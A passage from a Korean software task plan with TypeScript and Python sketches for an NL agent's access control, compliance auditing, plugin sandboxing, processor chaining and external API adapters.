        actions: ["create", "read", "update", "delete", "analyze", "configure"],
      },
      {
        resource: "nl-analytics/*",
        actions: ["read", "export"],
      },
    ]);

    this.policies.set("power_user", [
      {
        resource: "nl-input/analyze",
        actions: ["create", "read", "update"],
        conditions: {
          rateLimit: 1000, // 일일 요청 수
          maxInputLength: 10000,
        },
      },
      {
        resource: "nl-input/clarify/*",
        actions: ["create", "read"],
      },
      {
        resource: "nl-input/feedback",
        actions: ["create"],
      },
    ]);

    this.policies.set("user", [
      {
        resource: "nl-input/analyze",
        actions: ["create", "read"],
        conditions: {
          rateLimit: 100,
          maxInputLength: 5000,
        },
      },
      {
        resource: "nl-input/clarify/*",
        actions: ["create", "read"],
        conditions: {
          ownResourceOnly: true,
        },
      },
    ]);

    this.policies.set("guest", [
      {
        resource: "nl-input/analyze",
        actions: ["create"],
        conditions: {
          rateLimit: 10,
          maxInputLength: 1000,
          requiresCaptcha: true,
        },
      },
    ]);
  }

  generateToken(user: {
    id: string;
    role: string;
    permissions?: string[];
  }): string {
    const payload: TokenPayload = {
      userId: user.id,
      role: user.role,
      permissions: user.permissions || this.getDefaultPermissions(user.role),
      sessionId: generateSessionId(),
      exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24, // 24시간
    };

    return jwt.sign(payload, this.jwtSecret, {
      algorithm: "HS256",
    });
  }

  verifyToken(token: string): TokenPayload | null {
    try {
      const payload = jwt.verify(token, this.jwtSecret) as TokenPayload;

      // 추가 검증
      if (payload.exp < Math.floor(Date.now() / 1000)) {
        return null;
      }

      return payload;
    } catch (error) {
      return null;
    }
  }

  async checkAccess(
    user: TokenPayload,
    resource: string,
    action: string,
    context?: Record<string, any>
  ): Promise<boolean> {
    // 1. 역할 기반 정책 확인
    const userPolicies = this.getPoliciesForRole(user.role);

    for (const policy of userPolicies) {
      if (
        this.matchResource(resource, policy.resource) &&
        policy.actions.includes(action)
      ) {
        // 조건 확인
        if (policy.conditions) {
          const conditionsMet = await this.checkConditions(
            user,
            policy.conditions,
            context
          );

          if (!conditionsMet) {
            continue;
          }
        }

        return true;
      }
    }

    // 2. 개별 권한 확인
    const requiredPermission = `${resource}:${action}`;
    if (user.permissions.includes(requiredPermission)) {
      return true;
    }

    return false;
  }

  private getPoliciesForRole(role: string): AccessPolicy[] {
    const policies: AccessPolicy[] = [];

    // 현재 역할의 정책
    policies.push(...(this.policies.get(role) || []));

    // 상속된 역할의 정책
    const inheritedRoles = this.roleHierarchy.get(role) || [];
    for (const inheritedRole of inheritedRoles) {
      policies.push(...(this.policies.get(inheritedRole) || []));
    }

    return policies;
  }

  private matchResource(
    requestedResource: string,
    policyResource: string
  ): boolean {
    // 와일드카드 매칭
    const regex = new RegExp("^" + policyResource.replace(/\*/g, ".*") + "$");
    return regex.test(requestedResource);
  }

  private async checkConditions(
    user: TokenPayload,
    conditions: Record<string, any>,
    context?: Record<string, any>
  ): Promise<boolean> {
    // Rate limit 확인
    if (conditions.rateLimit) {
      const currentUsage = await this.getRateLimitUsage(user.userId);
      if (currentUsage >= conditions.rateLimit) {
        return false;
      }
    }

    // 입력 길이 제한
    if (conditions.maxInputLength && context?.inputLength) {
      if (context.inputLength > conditions.maxInputLength) {
        return false;
      }
    }

    // 리소스 소유권 확인
    if (conditions.ownResourceOnly && context?.resourceOwnerId) {
      if (context.resourceOwnerId !== user.userId) {
        return false;
      }
    }

    // CAPTCHA 확인
    if (conditions.requiresCaptcha && !context?.captchaVerified) {
      return false;
    }

    return true;
  }

  // Express 미들웨어
  authenticate() {
    return async (req: Request, res: Response, next: NextFunction) => {
      const token = this.extractToken(req);

      if (!token) {
        return res.status(401).json({
          error: "Authentication required",
        });
      }

      const payload = this.verifyToken(token);
      if (!payload) {
        return res.status(401).json({
          error: "Invalid or expired token",
        });
      }

      // 요청에 사용자 정보 추가
      (req as any).user = payload;
      next();
    };
  }

  authorize(resource: string, action: string) {
    return async (req: Request, res: Response, next: NextFunction) => {
      const user = (req as any).user as TokenPayload;

      if (!user) {
        return res.status(401).json({
          error: "Authentication required",
        });
      }

      // 컨텍스트 수집
      const context = {
        inputLength: req.body?.description?.length,
        resourceOwnerId: req.params?.userId,
        captchaVerified: req.body?.captchaToken
          ? await this.verifyCaptcha(req.body.captchaToken)
          : false,
      };

      const hasAccess = await this.checkAccess(user, resource, action, context);

      if (!hasAccess) {
        return res.status(403).json({
          error: "Access denied",
          required: `${resource}:${action}`,
        });
      }

      // Rate limiting 업데이트
      await this.updateRateLimit(user.userId);

      next();
    };
  }

  private extractToken(req: Request): string | null {
    // Bearer 토큰
    const authHeader = req.headers.authorization;
    if (authHeader?.startsWith("Bearer ")) {
      return authHeader.substring(7);
    }

    // 쿠키
    if (req.cookies?.auth_token) {
      return req.cookies.auth_token;
    }

    // 쿼리 파라미터 (WebSocket용)
    if (req.query?.token) {
      return req.query.token as string;
    }

    return null;
  }
}

// 사용 예시
const accessControl = new NLAccessControl();

// 라우트 보호
app.post(
  "/api/v1/nl-input/analyze",
  accessControl.authenticate(),
  accessControl.authorize("nl-input/analyze", "create"),
  async (req, res) => {
    // 인증 및 인가된 요청 처리
  }
);
```

**검증 기준**:

- [ ] JWT 기반 인증
- [ ] 역할 기반 접근 제어 (RBAC)
- [ ] 세밀한 권한 관리
- [ ] Rate limiting 통합

#### SubTask 4.7.4: 컴플라이언스 및 감사

**담당자**: 컴플라이언스 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_compliance_audit.py
from typing import Dict, List, Optional, Any
from datetime import datetime, timedelta
import json
from enum import Enum

class ComplianceStandard(Enum):
    GDPR = "gdpr"
    CCPA = "ccpa"
    HIPAA = "hipaa"
    SOC2 = "soc2"
    ISO27001 = "iso27001"

class ComplianceAuditor:
    """NL Agent 컴플라이언스 및 감사"""

    def __init__(self):
        self.audit_logger = AuditLogger()
        self.compliance_rules = self._load_compliance_rules()
        self.data_processor = DataComplianceProcessor()

    def _load_compliance_rules(self) -> Dict[ComplianceStandard, Dict]:
        """컴플라이언스 규칙 로드"""
        return {
            ComplianceStandard.GDPR: {
                "data_retention_days": 730,  # 2년
                "requires_explicit_consent": True,
                "right_to_erasure": True,
                "data_portability": True,
                "privacy_by_design": True,
                "breach_notification_hours": 72
            },
            ComplianceStandard.CCPA: {
                "data_retention_days": 365,
                "opt_out_required": True,
                "data_sale_disclosure": True,
                "access_request_days": 45
            },
            ComplianceStandard.HIPAA: {
                "data_retention_days": 2190,  # 6년
                "encryption_required": True,
                "access_controls": "strict",
                "audit_retention_days": 2190
            }
        }

    async def audit_request(
        self,
        request_id: str,
        user_id: str,
        action: str,
        resource: str,
        data: Optional[Dict[str, Any]] = None,
        result: Optional[str] = None
    ):
        """API 요청 감사"""

        audit_entry = {
            "audit_id": generate_audit_id(),
            "timestamp": datetime.utcnow().isoformat(),
            "request_id": request_id,
            "user_id": hashlib.sha256(user_id.encode()).hexdigest(),
            "action": action,
            "resource": resource,
            "ip_address": self._get_client_ip(),
            "user_agent": self._get_user_agent(),
            "result": result or "success",
            "data_accessed": self._classify_data_access(data) if data else None,
            "compliance_checks": await self._run_compliance_checks(action, data)
        }

        # 감사 로그 저장
        await self.audit_logger.log(audit_entry)

        # 실시간 컴플라이언스 위반 검사
        violations = await self._check_violations(audit_entry)
        if violations:
            await self._handle_violations(violations, audit_entry)

    async def _run_compliance_checks(
        self,
        action: str,
        data: Optional[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """컴플라이언스 체크 실행"""

        checks = {}

        # GDPR 체크
        if self._is_eu_user():
            checks["gdpr"] = {
                "consent_verified": await self._verify_consent(action),
                "lawful_basis": self._determine_lawful_basis(action),
                "data_minimization": self._check_data_minimization(data)
            }

        # CCPA 체크
        if self._is_california_user():
            checks["ccpa"] = {
                "opt_out_respected": await self._check_opt_out_status(),
                "data_categories": self._categorize_data(data)
            }

        # HIPAA 체크 (의료 관련 프로젝트)
        if await self._contains_health_data(data):
            checks["hipaa"] = {
                "encryption_used": True,  # 항상 암호화
                "minimum_necessary": self._check_minimum_necessary(data),
                "authorization_valid": await self._verify_hipaa_authorization()
            }

        return checks

    async def generate_compliance_report(
        self,
        standard: ComplianceStandard,
        start_date: datetime,
        end_date: datetime
    ) -> Dict[str, Any]:
        """컴플라이언스 보고서 생성"""

        report = {
            "standard": standard.value,
            "period": {
                "start": start_date.isoformat(),
                "end": end_date.isoformat()
            },
            "summary": {},
            "violations": [],
            "recommendations": []
        }

        if standard == ComplianceStandard.GDPR:
            report["summary"] = await self._generate_gdpr_summary(start_date, end_date)
            report["data_subject_requests"] = await self._get_dsr_summary(start_date, end_date)
            report["consent_metrics"] = await self._get_consent_metrics(start_date, end_date)

        elif standard == ComplianceStandard.SOC2:
            report["controls"] = await self._evaluate_soc2_controls()
            report["incidents"] = await self._get_security_incidents(start_date, end_date)
            report["availability_metrics"] = await self._calculate_availability()

        # 위반 사항 수집
        report["violations"] = await self._collect_violations(standard, start_date, end_date)

        # 개선 권고사항
        report["recommendations"] = self._generate_recommendations(report)

        return report

    async def handle_data_subject_request(
        self,
        request_type: str,
        user_id: str,
        details: Dict[str, Any]
    ) -> Dict[str, Any]:
        """데이터 주체 요청 처리 (GDPR/CCPA)"""

        request_id = generate_request_id()

        # 요청 기록
        await self._log_dsr(request_id, request_type, user_id, details)

        result = {}

        if request_type == "access":
            # 데이터 접근 요청
            user_data = await self._collect_user_data(user_id)
            result = {
                "request_id": request_id,
                "data": user_data,
                "generated_at": datetime.utcnow().isoformat()
            }

        elif request_type == "erasure":
            # 삭제 요청 (Right to be forgotten)
            deletion_result = await self._process_erasure_request(user_id)
            result = {
                "request_id": request_id,
                "deleted_records": deletion_result["count"],
                "retained_data": deletion_result["retained"],
                "retention_reasons": deletion_result["reasons"]
            }

        elif request_type == "portability":
            # 데이터 이동성 요청
            portable_data = await self._prepare_portable_data(user_id)
            result = {
                "request_id": request_id,
                "download_url": await self._generate_download_url(portable_data),
                "format": "json",
                "expires_at": (datetime.utcnow() + timedelta(days=7)).isoformat()
            }

        elif request_type == "rectification":
            # 정정 요청
            rectification_result = await self._process_rectification(
                user_id,
                details["corrections"]
            )
            result = {
                "request_id": request_id,
                "updated_fields": rectification_result["updated"],
                "failed_updates": rectification_result["failed"]
            }

        # 요청 완료 기록
        await self._complete_dsr(request_id, result)

        return result

    async def _process_erasure_request(
        self,
        user_id: str
    ) -> Dict[str, Any]:
        """삭제 요청 처리"""

        deletion_result = {
            "count": 0,
            "retained": [],
            "reasons": []
        }

        # 삭제 가능한 데이터 식별
        user_data = await self._collect_user_data(user_id)

        for data_category, records in user_data.items():
            # 법적 보존 의무 확인
            retention_required = await self._check_legal_retention(
                data_category,
                records
            )

            if retention_required:
                deletion_result["retained"].append(data_category)
                deletion_result["reasons"].append(retention_required["reason"])
            else:
                # 데이터 삭제
                deleted_count = await self._delete_user_data(
                    user_id,
                    data_category,
                    records
                )
                deletion_result["count"] += deleted_count

        # 삭제 증명서 생성
        await self._generate_deletion_certificate(user_id, deletion_result)

        return deletion_result

class AuditLogger:
    """감사 로그 관리"""

    def __init__(self):
        self.storage = AuditStorage()
        self.encryptor = LogEncryptor()

    async def log(self, entry: Dict[str, Any]):
        """감사 로그 기록"""

        # 로그 암호화
        encrypted_entry = await self.encryptor.encrypt(entry)

        # 무결성 해시 추가
        entry_with_hash = {
            **encrypted_entry,
            "integrity_hash": self._calculate_hash(encrypted_entry)
        }

        # 저장
        await self.storage.store(entry_with_hash)

        # 중요 이벤트는 별도 알림
        if self._is_critical_event(entry):
            await self._send_critical_alert(entry)

    def _calculate_hash(self, entry: Dict[str, Any]) -> str:
        """무결성 해시 계산"""
        import hashlib
        serialized = json.dumps(entry, sort_keys=True)
        return hashlib.sha256(serialized.encode()).hexdigest()
```

**검증 기준**:

- [ ] 주요 컴플라이언스 표준 지원
- [ ] 자동 감사 로그 생성
- [ ] 데이터 주체 권리 처리
- [ ] 컴플라이언스 보고서 생성

---

### Task 4.8: NL Agent 확장성 및 플러그인 시스템

#### SubTask 4.8.1: 플러그인 아키텍처 설계

**담당자**: 소프트웨어 아키텍트  
**예상 소요시간**: 14시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_plugin_system.py
from abc import ABC, abstractmethod
from typing import Dict, List, Any, Optional, Type
import importlib
import inspect
from dataclasses import dataclass

@dataclass
class PluginMetadata:
    name: str
    version: str
    author: str
    description: str
    dependencies: List[str]
    capabilities: List[str]
    configuration_schema: Dict[str, Any]

class NLPlugin(ABC):
    """NL Agent 플러그인 베이스 클래스"""

    @property
    @abstractmethod
    def metadata(self) -> PluginMetadata:
        """플러그인 메타데이터"""
        pass

    @abstractmethod
    async def initialize(self, config: Dict[str, Any]):
        """플러그인 초기화"""
        pass

    @abstractmethod
    async def process(self, input_data: Any, context: Dict[str, Any]) -> Any:
        """플러그인 처리 로직"""
        pass

    @abstractmethod
    async def cleanup(self):
        """플러그인 정리"""
        pass

    def validate_config(self, config: Dict[str, Any]) -> bool:
        """설정 검증"""
        schema = self.metadata.configuration_schema
        # JSON Schema 검증 로직
        return True

class NLPluginManager:
    """플러그인 관리자"""

    def __init__(self):
        self.plugins: Dict[str, NLPlugin] = {}
        self.plugin_registry = PluginRegistry()
        self.dependency_resolver = DependencyResolver()
        self.sandbox_executor = SandboxExecutor()

    async def load_plugin(self, plugin_path: str) -> str:
        """플러그인 로드"""

        try:
            # 플러그인 모듈 동적 로드
            spec = importlib.util.spec_from_file_location(
                "plugin_module",
                plugin_path
            )
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)

            # NLPlugin 서브클래스 찾기
            plugin_class = None
            for name, obj in inspect.getmembers(module):
                if (inspect.isclass(obj) and
                    issubclass(obj, NLPlugin) and
                    obj != NLPlugin):
                    plugin_class = obj
                    break

            if not plugin_class:
                raise ValueError("No valid plugin class found")

            # 플러그인 인스턴스 생성
            plugin_instance = plugin_class()
            metadata = plugin_instance.metadata

            # 의존성 확인
            await self._check_dependencies(metadata.dependencies)

            # 보안 검증
            await self._validate_plugin_security(plugin_instance)

            # 플러그인 등록
            self.plugins[metadata.name] = plugin_instance
            await self.plugin_registry.register(metadata)

            logger.info(f"Plugin loaded: {metadata.name} v{metadata.version}")
            return metadata.name

        except Exception as e:
            logger.error(f"Failed to load plugin from {plugin_path}: {str(e)}")
            raise PluginLoadError(f"Plugin load failed: {str(e)}")

    async def unload_plugin(self, plugin_name: str):
        """플러그인 언로드"""

        if plugin_name not in self.plugins:
            raise PluginNotFoundError(f"Plugin {plugin_name} not found")

        plugin = self.plugins[plugin_name]

        # 플러그인 정리
        await plugin.cleanup()

        # 등록 해제
        del self.plugins[plugin_name]
        await self.plugin_registry.unregister(plugin_name)

        logger.info(f"Plugin unloaded: {plugin_name}")

    async def execute_plugin(
        self,
        plugin_name: str,
        input_data: Any,
        context: Dict[str, Any],
        timeout: int = 30
    ) -> Any:
        """플러그인 실행"""

        if plugin_name not in self.plugins:
            raise PluginNotFoundError(f"Plugin {plugin_name} not found")

        plugin = self.plugins[plugin_name]

        # 샌드박스 환경에서 실행
        result = await self.sandbox_executor.execute(
            plugin.process,
            input_data,
            context,
            timeout=timeout
        )

        return result

    async def _check_dependencies(self, dependencies: List[str]):
        """의존성 확인"""

        missing_deps = []

        for dep in dependencies:
            if dep.startswith("plugin:"):
                # 다른 플러그인 의존성
                plugin_name = dep.replace("plugin:", "")
                if plugin_name not in self.plugins:
                    missing_deps.append(dep)
            else:
                # 시스템 의존성
                if not self._check_system_dependency(dep):
                    missing_deps.append(dep)

        if missing_deps:
            raise DependencyError(f"Missing dependencies: {missing_deps}")

    async def _validate_plugin_security(self, plugin: NLPlugin):
        """플러그인 보안 검증"""

        # 위험한 import 검사
        dangerous_imports = [
            'os', 'subprocess', 'eval', 'exec',
            '__import__', 'compile', 'open'
        ]

        # 플러그인 코드 검사
        source_code = inspect.getsource(plugin.__class__)
        for dangerous in dangerous_imports:
            if dangerous in source_code:
                raise SecurityError(
                    f"Plugin contains potentially dangerous import: {dangerous}"
                )

        # 권한 검사
        required_permissions = plugin.metadata.capabilities
        if not self._validate_permissions(required_permissions):
            raise SecurityError("Plugin requires excessive permissions")

# 플러그인 예제: 도메인 특화 언어 처리
class DomainSpecificPlugin(NLPlugin):
    """도메인 특화 언어 처리 플러그인"""

    @property
    def metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="domain-specific-processor",
            version="1.0.0",
            author="T-Developer Team",
            description="Process domain-specific language requirements",
            dependencies=["spacy>=3.0", "transformers>=4.0"],
            capabilities=["text_processing", "entity_extraction"],
            configuration_schema={
                "type": "object",
                "properties": {
                    "domain": {
                        "type": "string",
                        "enum": ["medical", "legal", "finance"]
                    },
                    "model_path": {"type": "string"}
                },
                "required": ["domain"]
            }
        )

    async def initialize(self, config: Dict[str, Any]):
        """플러그인 초기화"""
        self.domain = config["domain"]
        self.model = await self._load_domain_model(config.get("model_path"))
        self.entity_extractor = DomainEntityExtractor(self.domain)

    async def process(
        self,
        input_data: str,
        context: Dict[str, Any]
    ) -> Dict[str, Any]:
        """도메인 특화 처리"""

        # 도메인별 전처리
        preprocessed = await self._preprocess_for_domain(input_data)

        # 엔티티 추출
        entities = await self.entity_extractor.extract(preprocessed)

        # 도메인 특화 요구사항 분석
        requirements = await self._analyze_domain_requirements(
            preprocessed,
            entities
        )

        return {
            "domain": self.domain,
            "entities": entities,
            "requirements": requirements,
            "confidence": self._calculate_confidence(entities, requirements)
        }

    async def cleanup(self):
        """리소스 정리"""
        if hasattr(self, 'model'):
            del self.model

# 플러그인 실행 샌드박스
class SandboxExecutor:
    """안전한 플러그인 실행 환경"""

    def __init__(self):
        self.resource_limiter = ResourceLimiter()
        self.permission_manager = PermissionManager()

    async def execute(
        self,
        func: callable,
        *args,
        timeout: int = 30,
        **kwargs
    ) -> Any:
        """샌드박스에서 함수 실행"""

        # 리소스 제한 설정
        with self.resource_limiter.limit(
            cpu_percent=50,
            memory_mb=512,
            disk_io_mb_per_sec=10
        ):
            # 권한 제한
            with self.permission_manager.restrict(
                network_access=False,
                file_system_access="read_only",
                system_calls=False
            ):
                # 타임아웃 적용
                try:
                    result = await asyncio.wait_for(
                        func(*args, **kwargs),
                        timeout=timeout
                    )
                    return result
                except asyncio.TimeoutError:
                    raise PluginTimeoutError(
                        f"Plugin execution timed out after {timeout}s"
                    )
```

**검증 기준**:

- [ ] 플러그인 동적 로드/언로드
- [ ] 의존성 관리 시스템
- [ ] 샌드박스 실행 환경
- [ ] 보안 검증 메커니즘

#### SubTask 4.8.2: 커스텀 프로세서 개발 프레임워크

**담당자**: 프레임워크 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```typescript
// backend/src/agents/implementations/nl-custom-processor-framework.ts
interface ProcessorContext {
  sessionId: string;
  userId: string;
  projectId?: string;
  metadata: Record<string, any>;
  sharedState: Map<string, any>;
}

interface ProcessorResult<T = any> {
  success: boolean;
  data?: T;
  error?: Error;
  metadata?: Record<string, any>;
  nextProcessor?: string;
}

abstract class CustomProcessor<TInput = any, TOutput = any> {
  protected name: string;
  protected version: string;
  protected config: Record<string, any>;

  constructor(name: string, version: string = "1.0.0") {
    this.name = name;
    this.version = version;
    this.config = {};
  }

  // 추상 메서드들
  abstract async validate(input: TInput): Promise<boolean>;
  abstract async process(
    input: TInput,
    context: ProcessorContext
  ): Promise<ProcessorResult<TOutput>>;

  // 선택적 훅
  async beforeProcess(
    input: TInput,
    context: ProcessorContext
  ): Promise<void> {}
  async afterProcess(
    result: ProcessorResult<TOutput>,
    context: ProcessorContext
  ): Promise<void> {}
  async onError(error: Error, context: ProcessorContext): Promise<void> {}

  // 유틸리티 메서드
  protected async cacheResult(
    key: string,
    value: any,
    ttl: number = 3600
  ): Promise<void> {
    await cache.set(`processor:${this.name}:${key}`, value, ttl);
  }

  protected async getCached(key: string): Promise<any> {
    return cache.get(`processor:${this.name}:${key}`);
  }
}

// 프로세서 체인 빌더
class ProcessorChainBuilder {
  private processors: CustomProcessor[] = [];
  private errorHandlers: Map<string, (error: Error) => Promise<void>> =
    new Map();
  private middlewares: Array<(ctx: ProcessorContext) => Promise<void>> = [];

  add<T extends CustomProcessor>(
    processor: T,
    condition?: (input: any, context: ProcessorContext) => boolean
  ): this {
    if (condition) {
      // 조건부 프로세서 래핑
      const conditionalProcessor = new ConditionalProcessor(
        processor,
        condition
      );
      this.processors.push(conditionalProcessor);
    } else {
      this.processors.push(processor);
    }
    return this;
  }

  parallel<T extends CustomProcessor>(...processors: T[]): this {
    const parallelProcessor = new ParallelProcessor(processors);
    this.processors.push(parallelProcessor);
    return this;
  }

  branch(
    condition: (input: any, context: ProcessorContext) => boolean,
    trueChain: ProcessorChainBuilder,
    falseChain?: ProcessorChainBuilder
  ): this {
    const branchProcessor = new BranchProcessor(
      condition,
      trueChain,
      falseChain
    );
    this.processors.push(branchProcessor);
    return this;
  }

  retry(processor: CustomProcessor, options: RetryOptions): this {
    const retryProcessor = new RetryProcessor(processor, options);
    this.processors.push(retryProcessor);
    return this;
  }

  onError(
    processorName: string,
    handler: (error: Error) => Promise<void>
  ): this {
    this.errorHandlers.set(processorName, handler);
    return this;
  }

  use(middleware: (ctx: ProcessorContext) => Promise<void>): this {
    this.middlewares.push(middleware);
    return this;
  }

  build(): ProcessorChain {
    return new ProcessorChain(
      this.processors,
      this.errorHandlers,
      this.middlewares
    );
  }
}

// 프로세서 체인 실행기
class ProcessorChain {
  constructor(
    private processors: CustomProcessor[],
    private errorHandlers: Map<string, (error: Error) => Promise<void>>,
    private middlewares: Array<(ctx: ProcessorContext) => Promise<void>>
  ) {}

  async execute<T = any>(
    input: any,
    context: ProcessorContext
  ): Promise<ProcessorResult<T>> {
    // 미들웨어 실행
    for (const middleware of this.middlewares) {
      await middleware(context);
    }

    let currentInput = input;
    let lastResult: ProcessorResult<any> = { success: true };

    for (const processor of this.processors) {
      try {
        // 프로세서 실행
        await processor.beforeProcess(currentInput, context);

        const result = await processor.process(currentInput, context);

        await processor.afterProcess(result, context);

        if (!result.success) {
          return result;
        }

        // 다음 프로세서를 위한 입력 준비
        currentInput = result.data || currentInput;
        lastResult = result;

        // 다음 프로세서 지정이 있으면 점프
        if (result.nextProcessor) {
          const nextIndex = this.processors.findIndex(
            (p) => p.name === result.nextProcessor
          );
          if (nextIndex > -1) {
            // 지정된 프로세서로 점프
            continue;
          }
        }
      } catch (error) {
        // 에러 핸들러 실행
        const handler = this.errorHandlers.get(processor.name);
        if (handler) {
          await handler(error);
        }

        await processor.onError(error, context);

        return {
          success: false,
          error: error,
          metadata: { failedProcessor: processor.name },
        };
      }
    }

    return lastResult;
  }
}

// 커스텀 프로세서 예제
class LanguageDetectionProcessor extends CustomProcessor<
  string,
  { language: string; confidence: number }
> {
  constructor() {
    super("language-detection", "1.0.0");
  }

  async validate(input: string): Promise<boolean> {
    return typeof input === "string" && input.length > 0;
  }

  async process(
    input: string,
    context: ProcessorContext
  ): Promise<ProcessorResult<{ language: string; confidence: number }>> {
    try {
      // 캐시 확인
      const cacheKey = `lang:${hashString(input)}`;
      const cached = await this.getCached(cacheKey);

      if (cached) {
        return {
          success: true,
          data: cached,
          metadata: { fromCache: true },
        };
      }

      // 언어 감지 로직
      const detected = await detectLanguage(input);

      // 결과 캐싱
      await this.cacheResult(cacheKey, detected);

      // 컨텍스트에 언어 정보 저장
      context.sharedState.set("detectedLanguage", detected.language);

      return {
        success: true,
        data: detected,
        metadata: { processingTime: Date.now() },
      };
    } catch (error) {
      return {
        success: false,
        error: error as Error,
      };
    }
  }
}

class TranslationProcessor extends CustomProcessor<string, string> {
  constructor(private targetLanguage: string = "en") {
    super("translation", "1.0.0");
  }

  async validate(input: string): Promise<boolean> {
    return typeof input === "string" && input.length > 0;
  }

  async process(
    input: string,
    context: ProcessorContext
  ): Promise<ProcessorResult<string>> {
    // 소스 언어 확인
    const sourceLanguage =
      context.sharedState.get("detectedLanguage") || "auto";

    if (sourceLanguage === this.targetLanguage) {
      // 번역 불필요
      return {
        success: true,
        data: input,
        metadata: { skipped: true },
      };
    }

    try {
      const translated = await translateText(
        input,
        sourceLanguage,
        this.targetLanguage
      );

      return {
        success: true,
        data: translated,
        metadata: {
          sourceLanguage,
          targetLanguage: this.targetLanguage,
        },
      };
    } catch (error) {
      return {
        success: false,
        error: error as Error,
      };
    }
  }
}

// 사용 예시
const nlProcessingChain = new ProcessorChainBuilder()
  // 언어 감지
  .add(new LanguageDetectionProcessor())

  // 영어가 아닌 경우 번역
  .add(
    new TranslationProcessor("en"),
    (input, ctx) => ctx.sharedState.get("detectedLanguage") !== "en"
  )

  // 병렬 처리
  .parallel(
    new EntityExtractionProcessor(),
    new SentimentAnalysisProcessor(),
    new IntentClassificationProcessor()
  )

  // 조건부 분기
  .branch(
    (input, ctx) => ctx.sharedState.get("intent") === "technical",
    new ProcessorChainBuilder()
      .add(new TechnicalRequirementProcessor())
      .add(new ArchitectureAnalysisProcessor()),
    new ProcessorChainBuilder().add(new GeneralRequirementProcessor())
  )

  // 에러 핸들링
  .onError("translation", async (error) => {
    logger.error("Translation failed", error);
  })

  // 미들웨어
  .use(async (ctx) => {
    // 처리 시작 로깅
    logger.info(`Processing started for session: ${ctx.sessionId}`);
  })

  .build();

// 실행
const result = await nlProcessingChain.execute(userInput, {
  sessionId: "session-123",
  userId: "user-456",
  metadata: {},
  sharedState: new Map(),
});
```

**검증 기준**:

- [ ] 체인 가능한 프로세서 아키텍처
- [ ] 조건부/병렬 처리 지원
- [ ] 에러 핸들링 및 재시도
- [ ] 상태 공유 메커니즘

#### SubTask 4.8.3: 외부 서비스 통합 어댑터

**담당자**: 통합 개발자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_service_adapters.py
from abc import ABC, abstractmethod
from typing import Dict, Any, Optional, List
import aiohttp
from tenacity import retry, stop_after_attempt, wait_exponential

class ServiceAdapter(ABC):
    """외부 서비스 어댑터 베이스 클래스"""

    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.base_url = config.get('base_url')
        self.api_key = config.get('api_key')
        self.timeout = config.get('timeout', 30)
        self.session: Optional[aiohttp.ClientSession] = None

    async def __aenter__(self):
        self.session = aiohttp.ClientSession(
            headers=self._get_headers(),
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        )
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    @abstractmethod
    def _get_headers(self) -> Dict[str, str]:
        """서비스별 헤더 생성"""
        pass

    @abstractmethod
    async def process(self, input_data: Any) -> Any:
        """서비스 처리 로직"""
        pass

    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=4, max=10)
    )
    async def _make_request(
        self,
        method: str,
        endpoint: str,
        **kwargs
    ) -> Dict[str, Any]:
        """HTTP 요청 with 재시도"""

        url = f"{self.base_url}/{endpoint}"

        async with self.session.request(method, url, **kwargs) as response:
            response.raise_for_status()
            return await response.json()

# OpenAI GPT 어댑터
class OpenAIAdapter(ServiceAdapter):
    """OpenAI API 어댑터"""

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Authorization': f'Bearer {self.api_key}',
            'Content-Type': 'application/json'
        }

    async def process(
        self,
        prompt: str,
        model: str = "gpt-4",
        temperature: float = 0.7,
        max_tokens: int = 1000
    ) -> str:
        """GPT 모델 호출"""

        data = {
            "model": model,
            "messages": [
                {"role": "user", "content": prompt}
            ],
            "temperature": temperature,
            "max_tokens": max_tokens
        }

        response = await self._make_request(
            "POST",
            "chat/completions",
            json=data
        )

        return response["choices"][0]["message"]["content"]

# Google Cloud Translation 어댑터
class GoogleTranslateAdapter(ServiceAdapter):
    """Google Cloud Translation API 어댑터"""

    def _get_headers(self) -> Dict[str, str]:
        return {
            'Content-Type': 'application/json',
            'X-Goog-Api-Key': self.api_key
        }

    async def process(
        self,
        text: str,
        target_language: str,
        source_language: Optional[str] = None
    ) -> Dict[str, Any]:
        """텍스트 번역"""

        data = {
            "q": text,
            "target": target_language
        }

        if source_language:
            data["source"] = source_language

        response = await self._make_request(
            "POST",
            "language/translate/v2",
            json=data
        )

        return {
            "translatedText": response["data"]["translations"][0]["translatedText"],
            "detectedSourceLanguage": response["data"]["translations"][0].get(
                "detectedSourceLanguage"
            )
        }

# 커스텀 NLP 서비스 어댑터
class CustomNLPAdapter(ServiceAdapter):
    """사내 NLP 서비스 어댑터"""

    def _get_headers(self) -> Dict[str, str]:
        return {
            'X-API-Key': self.api_key,
            'Content-Type': 'application/json',
            'X-Service-Version': '2.0'
        }

    async def process(
        self,
        text: str,
        operations: List[str]
    ) -> Dict[str, Any]:
        """커스텀 NLP 처리"""

        data = {
            "text": text,
            "operations": operations,
            "options": {
                "language": "auto",
                "return_confidence": True
            }
        }

        response = await self._make_request(
            "POST",
            "nlp/analyze",
            json=data
        )

        return response["results"]

# 어댑터 매니저
class AdapterManager:
    """외부 서비스 어댑터 관리"""

    def __init__(self):
        self.adapters: Dict[str, Type[ServiceAdapter]] = {
            'openai': OpenAIAdapter,
            'google_translate': GoogleTranslateAdapter,
            'custom_nlp': CustomNLPAdapter
        }
        self.instances: Dict[str, ServiceAdapter] = {}
        self.config_store = ConfigStore()

    async def get_adapter(self, service_name: str) -> ServiceAdapter:
        """어댑터 인스턴스 가져오기"""

        if service_name not in self.instances:
            if service_name not in self.adapters:
                raise ValueError(f"Unknown service: {service_name}")

            # 설정 로드
            config = await self.config_store.get_service_config(service_name)

            # 인스턴스 생성
            adapter_class = self.adapters[service_name]
            self.instances[service_name] = adapter_class(config)

        return self.instances[service_name]

    def register_adapter(
        self,
        service_name: str,
        adapter_class: Type[ServiceAdapter]
    ):
        """새로운 어댑터 등록"""

